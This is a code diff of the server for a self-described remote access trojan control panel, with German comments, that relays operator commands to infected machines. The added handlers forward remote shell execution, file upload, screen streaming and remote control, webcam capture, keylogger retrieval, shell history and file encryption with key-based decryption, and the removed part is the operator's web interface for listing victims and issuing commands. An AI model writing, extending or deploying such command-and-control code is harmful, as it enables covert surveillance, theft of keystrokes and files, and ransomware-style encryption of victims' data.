@@ -77,240 +77,7 @@ async def login(request: Request):
 
 @app.get("/", response_class=HTMLResponse)
 async def get_index(request: Request):
-    # Erstelle eine einfache HTML-Seite falls index.html nicht existiert
-    html_content = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>RAT Control Panel</title>
-    <meta charset="UTF-8">
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; }
-        .login-form { max-width: 400px; margin: 50px auto; padding: 20px; border: 1px solid #ccc; }
-        .main-ui { display: none; }
-        .client-list { margin: 20px 0; }
-        .client-item { padding: 10px; margin: 5px 0; border: 1px solid #ddd; background: #f9f9f9; }
-        .client-item.selected { background: #e6f3ff; }
-        .command-area { margin: 20px 0; }
-        .output-area { height: 300px; overflow-y: auto; border: 1px solid #ccc; padding: 10px; background: #f5f5f5; }
-        button { padding: 8px 16px; margin: 5px; }
-        input, select { padding: 5px; margin: 5px; }
-        .status { padding: 10px; margin: 10px 0; background: #e6ffe6; border: 1px solid #4CAF50; }
-    </style>
-</head>
-<body>
-    <div id="login-form" class="login-form">
-        <h2>RAT Control Panel Login</h2>
-        <input type="text" id="username" placeholder="Username" />
-        <input type="password" id="password" placeholder="Password" />
-        <button onclick="login()">Login</button>
-        <div id="login-error" style="color: red; display: none;"></div>
-    </div>
-
-    <div id="main-ui" class="main-ui">
-        <h1>RAT Control Panel</h1>
-        <div id="status" class="status">Verbinde...</div>
-        
-        <div class="client-list">
-            <h3>Verbundene Clients:</h3>
-            <div id="clients"></div>
-        </div>
-
-        <div class="command-area">
-            <h3>Befehle:</h3>
-            <button onclick="sendCommand('systeminfo')">System Info</button>
-            <button onclick="sendCommand('screenshot')">Screenshot</button>
-            <button onclick="sendCommand('ls', {path: '.'})">Liste Dateien</button>
-            <br>
-            <input type="text" id="exec-command" placeholder="Befehl eingeben..." />
-            <button onclick="executeCommand()">Ausführen</button>
-        </div>
-
-        <div class="output-area">
-            <h3>Output:</h3>
-            <div id="output"></div>
-        </div>
-    </div>
-
-    <script>
-        let ws = null;
-        let selectedClient = null;
-        let token = localStorage.getItem('rat_token');
-
-        function login() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            fetch('/login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username, password })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.token) {
-                    token = data.token;
-                    localStorage.setItem('rat_token', token);
-                    document.getElementById('login-form').style.display = 'none';
-                    document.getElementById('main-ui').style.display = 'block';
-                    connectWebSocket();
-                } else {
-                    document.getElementById('login-error').style.display = 'block';
-                    document.getElementById('login-error').textContent = data.error;
-                }
-            })
-            .catch(error => {
-                document.getElementById('login-error').style.display = 'block';
-                document.getElementById('login-error').textContent = 'Login fehlgeschlagen';
-            });
-        }
-
-        function connectWebSocket() {
-            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-            ws = new WebSocket(`${protocol}//${window.location.host}/ws?token=${token}`);
-            
-            ws.onopen = function() {
-                document.getElementById('status').textContent = 'Verbunden';
-                document.getElementById('status').style.background = '#e6ffe6';
-                ws.send(JSON.stringify({action: 'get_clients'}));
-            };
-
-            ws.onmessage = function(event) {
-                const data = JSON.parse(event.data);
-                handleMessage(data);
-            };
-
-            ws.onclose = function() {
-                document.getElementById('status').textContent = 'Verbindung getrennt';
-                document.getElementById('status').style.background = '#ffe6e6';
-                setTimeout(connectWebSocket, 5000);
-            };
-
-            ws.onerror = function(error) {
-                document.getElementById('status').textContent = 'Verbindungsfehler';
-                document.getElementById('status').style.background = '#ffe6e6';
-            };
-        }
-
-        function handleMessage(data) {
-            switch(data.type) {
-                case 'client_list':
-                    updateClientList(data.clients);
-                    break;
-                case 'client_connected':
-                    addOutput(`Client verbunden: ${data.client.hostname} (${data.client.id})`);
-                    break;
-                case 'client_disconnected':
-                    addOutput(`Client getrennt: ${data.client_id}`);
-                    break;
-                case 'command_output':
-                    addOutput(`Output: ${data.output}`);
-                    break;
-                case 'screenshot':
-                    showScreenshot(data.data);
-                    break;
-                case 'debug':
-                    addOutput(`[${data.level}] ${data.msg}`);
-                    break;
-                case 'error':
-                    addOutput(`ERROR: ${data.message}`);
-                    break;
-            }
-        }
-
-        function updateClientList(clients) {
-            const clientsDiv = document.getElementById('clients');
-            clientsDiv.innerHTML = '';
-            
-            clients.forEach(client => {
-                const div = document.createElement('div');
-                div.className = 'client-item';
-                div.innerHTML = `
-                    <strong>${client.hostname}</strong> (ID: ${client.id})<br>
-                    OS: ${client.os}<br>
-                    IP: ${client.ip}
-                `;
-                div.onclick = () => selectClient(client.id, div);
-                clientsDiv.appendChild(div);
-            });
-        }
-
-        function selectClient(clientId, element) {
-            selectedClient = clientId;
-            document.querySelectorAll('.client-item').forEach(item => {
-                item.classList.remove('selected');
-            });
-            element.classList.add('selected');
-            addOutput(`Client ${clientId} ausgewählt`);
-        }
-
-        function sendCommand(action, params = {}) {
-            if (!selectedClient) {
-                addOutput('Kein Client ausgewählt');
-                return;
-            }
-            
-            const command = {
-                action: action,
-                target_id: selectedClient,
-                ...params
-            };
-            
-            ws.send(JSON.stringify(command));
-        }
-
-        function executeCommand() {
-            const command = document.getElementById('exec-command').value;
-            if (!command) return;
-            
-            sendCommand('exec', { command: command });
-            document.getElementById('exec-command').value = '';
-        }
-
-        function addOutput(message) {
-            const output = document.getElementById('output');
-            const div = document.createElement('div');
-            div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            output.appendChild(div);
-            output.scrollTop = output.scrollHeight;
-        }
-
-        function showScreenshot(data) {
-            const img = document.createElement('img');
-            img.src = 'data:image/png;base64,' + data;
-            img.style.maxWidth = '100%';
-            
-            const output = document.getElementById('output');
-            output.appendChild(img);
-            output.scrollTop = output.scrollHeight;
-        }
-
-        // Enter-Taste für Befehlseingabe
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('exec-command').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    executeCommand();
-                }
-            });
-            
-            document.getElementById('password').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    login();
-                }
-            });
-        });
-
-        // Auto-Login falls Token vorhanden
-        if (token) {
-            document.getElementById('login-form').style.display = 'none';
-            document.getElementById('main-ui').style.display = 'block';
-            connectWebSocket();
-        }
-    </script>
-</body>
-</html>
-    """
-    return HTMLResponse(content=html_content)
+    return FileResponse("index.html")
 
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
@@ -335,32 +102,55 @@ async def websocket_endpoint(websocket: WebSocket):
                     await websocket.send_json({"type": "pong"})
                     continue
 
+                if data.get("action") == "upload_chunk":
+                    target_id = data.get("target_id")
+                    try:
+                        target_id_int = int(target_id)
+                    except Exception:
+                        await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
+                        continue
+                    if target_id_int not in RAT_CLIENTS:
+                        await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
+                        continue
+                    target_ws = RAT_CLIENTS[target_id_int]
+                    payload = dict(data)
+                    payload["client_id"] = str(target_id_int)
+                    await target_ws.send(json.dumps(payload))
+                    await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Chunk {data.get('chunk_index', '?')+1}/{data.get('total_chunks', '?')} an Client {target_id_int} gesendet."})
+                    continue
+
                 if data.get("action") == "get_clients":
                     await send_client_list()
                     continue
 
-                # Behandle alle anderen Aktionen
+                if data.get('action') in ('screenstream_start', 'screenstream_stop', 'control', 'scan_cameras', 'webcam_start', 'webcam_stop'):
+                    target = data.get('target_id') or data.get('client_id')
+                    try:
+                        target_int = int(target)
+                    except Exception:
+                        await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Ungültige Client-ID: {target}"})
+                        continue
+                    if target_int in RAT_CLIENTS:
+                        payload = dict(data)
+                        payload["client_id"] = str(target_int)
+                        await RAT_CLIENTS[target_int].send(json.dumps(payload))
+                        await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Screenstream/Control an Client {target_int} weitergeleitet."})
+                    else:
+                        await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Client {target} nicht verbunden."})
+                    continue
+
                 action = data.get("action")
                 target_id = data.get("target_id")
-                
-                if not target_id:
-                    await send_to_web_ui({"type": "error", "message": "Keine Client-ID angegeben"})
-                    continue
-                
                 try:
                     target_id_int = int(target_id)
-                except ValueError:
-                    await send_to_web_ui({"type": "error", "message": "Ungültige Client-ID"})
+                except Exception:
+                    await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
                     continue
-                
                 if target_id_int not in RAT_CLIENTS:
-                    await send_to_web_ui({"type": "error", "message": f"Client {target_id_int} nicht verbunden"})
+                    await send_to_web_ui({"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."})
                     continue
-                
                 target_ws = RAT_CLIENTS[target_id_int]
                 payload = {"action": action, "client_id": str(target_id_int)}
-                
-                # Füge spezifische Parameter hinzu
                 if action == "exec":
                     payload["command"] = data.get("command")
                 elif action == "download":
@@ -369,14 +159,26 @@ async def websocket_endpoint(websocket: WebSocket):
                     payload["filename"] = data.get("filename")
                     payload["data"] = data.get("data")
                 elif action == "ls":
-                    payload["path"] = data.get("path", ".")
-                
+                    payload["path"] = data.get("path")
+                elif action == "history":
+                    payload["limit"] = data.get("limit")
+                elif action == "keylogger":
+                    payload["count"] = data.get("count")
+                elif action == "cd":
+                    payload["path"] = data.get("path")
+                elif action == "encrypt":
+                    payload["path"] = data.get("path")
+                elif action == "decrypt":
+                    payload["path"] = data.get("path")
+                    payload["key_hex"] = data.get("key_hex")
+                elif action in ("systeminfo", "shutdown", "restart", "screenshot", "screenstream_start", "screenstream_stop"):
+                    pass
                 try:
                     await target_ws.send(json.dumps(payload))
-                    await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Befehl '{action}' an Client {target_id_int} gesendet"})
+                    await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Befehl '{action}' an Client {target_id_int} gesendet."})
                 except Exception as e:
-                    await send_to_web_ui({"type": "error", "message": f"Fehler beim Senden an Client {target_id_int}: {str(e)}"})
-
+                    await send_to_web_ui({"type": "error", "message": f"Verbindung zu Client {target_id_int} verloren."})
+                    
             except asyncio.TimeoutError:
                 # Sende Ping
                 await websocket.send_json({"type": "ping"})
@@ -479,8 +281,17 @@ async def rat_client_endpoint(websocket: WebSocket):
     try:
         while True:
             try:
+                # Prüfe WebSocket-Status
+                if websocket.application_state.name == "DISCONNECTED":
+                    logging.info(f"[Client {client_id}] WebSocket bereits getrennt")
+                    break
+                
                 data = await asyncio.wait_for(websocket.receive(), timeout=300)
                 
+                if data["type"] == "websocket.disconnect":
+                    logging.info(f"[Client {client_id}] Disconnect-Nachricht empfangen")
+                    break
+                    
                 if data["type"] == "websocket.receive":
                     if "text" in data and data["text"]:
                         try:
@@ -490,18 +301,33 @@ async def rat_client_endpoint(websocket: WebSocket):
                                 continue
                             meta["client_id"] = str(client_id)
                             await send_to_web_ui(meta)
+                        except json.JSONDecodeError as e:
+                            logging.error(f"JSON Parse Error von Client {client_id}: {e}")
                         except Exception as e:
                             await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Fehler beim Parsen von Client {client_id}: {e}"})
                             
             except asyncio.TimeoutError:
-                logging.warning(f"[Client {client_id}] Timeout")
-                break
+                logging.info(f"[Client {client_id}] Timeout, sende Ping")
+                try:
+                    await websocket.send(json.dumps({"type": "ping"}))
+                except Exception:
+                    logging.info(f"[Client {client_id}] Ping fehlgeschlagen, Client getrennt")
+                    break
+                continue
             except WebSocketDisconnect:
                 logging.info(f"[Client {client_id}] WebSocket disconnect")
                 break
             except Exception as e:
-                logging.error(f"Fehler im Client-Handler (Client {client_id}): {e}")
-                break
+                error_msg = str(e)
+                if "disconnect message has been received" in error_msg:
+                    logging.info(f"[Client {client_id}] Client bereits getrennt")
+                    break
+                elif "connection is closed" in error_msg.lower():
+                    logging.info(f"[Client {client_id}] Verbindung ist geschlossen")
+                    break
+                else:
+                    logging.error(f"Fehler im Client-Handler (Client {client_id}): {e}")
+                    break
                 
     except Exception as e:
         logging.error(f"Unerwarteter Fehler mit Client {client_id}: {e}")
@@ -514,7 +340,7 @@ async def rat_client_endpoint(websocket: WebSocket):
         
         await send_to_web_ui({"type": "client_disconnected", "client_id": str(client_id)})
         await send_client_list()
-        logging.info(f"[-] RAT-Client {client_id} getrennt")
+        logging.info(f"[-] RAT-Client {client_id} ({hostname}) getrennt")
 
 def extract_hostname_from_sysinfo(sysinfo: str) -> str:
     for line in sysinfo.splitlines():
